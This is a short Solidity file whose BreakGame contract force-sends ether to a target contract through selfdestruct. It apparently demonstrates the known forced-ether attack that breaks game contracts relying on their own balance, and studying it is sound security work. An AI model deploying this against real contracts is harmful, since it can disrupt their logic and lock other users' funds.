//SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

contract BreakGame {
    function breakGame(address payable _gameContractAddress) public payable{
        selfdestruct(_gameContractAddress);
    }
}
